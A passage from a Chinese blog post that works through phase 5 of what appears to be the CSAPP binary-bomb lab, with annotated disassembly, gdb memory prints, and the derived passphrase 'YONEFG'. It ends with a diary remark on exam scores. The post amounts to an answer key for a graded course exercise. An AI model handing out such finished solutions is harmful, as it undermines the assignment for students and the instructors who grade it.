+   0x000000000040132e &lt;+19&gt;:    jne    0x401323 &lt;string_length+8&gt; //继续循环清空[rdx]，使其为0x0的时候才退出循环。此时rax里保存的值肯定是最终字符串高位地址减去低位地址得到的值，即是字符串的长度。
+   0x0000000000401330 &lt;+21&gt;:    repz ret //执行到这一步的时候就返回到了phase_5函数里。此时eax作为函数返回值，记录了字符串的长度。
+   0x0000000000401332 &lt;+23&gt;:    mov    eax,0x0
+   0x0000000000401337 &lt;+28&gt;:    ret    
+</code></pre>
+<p>返回到phase_5函数后，检查eax是否等于0x6，若等于则跳转到 0x4010d2 ，令eax=0后跳转到0x40108b。现在我们算是通过了第一个小关卡，即检查字符串长度为6，然后eax清零，进入下一个小关卡咯。</p>
+<p>至于0x40108b处的调试过程，我在代码段后面都有注释，自己看吧。</p>
+<p>直到0x401099这里，movzx  edx,BYTE PTR [rdx+0x4024b0]</p>
+<p>这个“基址” 0x4024b0里面存着什么内容呢？</p>
+<p>打印一下：</p>
+<pre><code class="c">gdb-peda$ p (char*)(0x4024b0)
+$10 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</code></pre>
+<p>那么我们应该要做的就是：以输入字符的低4位作为索引，去访问这个字符串的某一个字符，取出来0扩展为32位（movzx），并存储到%edx里</p>
+<p>0x4010bd调用字符串比对函数，参数是rdi为 rsp+0x10（即rsp+16） 处的值， 而要比对的对象esi是从0x40245e这个地址来的。查看一下这个地址：</p>
+<pre><code class="c">gdb-peda$ p (char*)(0x40245e)
+$11 = 0x40245e &quot;flyers&quot;</code></pre>
+<p>“flyers”刚好也是6个字符，所以猜测我们需要从 <code>&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</code>  这一长串字符串里寻找出这6个字符。</p>
+<p>就可以得到相应的索引位。（由于只有4位，所以最多能索引15）</p>
+<p>通过正确的索引位，把6个字符分别存到 rsp+16里,rsp+17里，rsp+18里……..rsp+21里。</p>
+<p>ok，大致流程搞明白了。</p>
+<p>所以分别算出 f l y e r s 各自的索引号为：9, 15 , 14 , 5 ,6 , 7 </p>
+<p>就拿f来说好了，f的索引为9,即二进制1001，所以只需要查询ascall码表后四位为 1001 的字符均可，我取的Ｙ(0x59)。</p>
+<p>以此类推得到6个字符的一个组合：YONEFG</p>
+<h2 id="6-phase-6："><a href="#6-phase-6：" class="headerlink" title="6.phase_6："></a>6.phase_6：</h2><p>先咕着，听说有点难。明天做吧。（准备跑步去了….</p>
+<h2 id="今日总结："><a href="#今日总结：" class="headerlink" title="今日总结："></a>今日总结：</h2><p>现在是晚上22:16，今晚浙江高考成绩以及分数线出来了。一段594分。今晚有多少家在狂喜，而又有多少家在忧愁呢。</p>
+<p>我还是不够努力。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
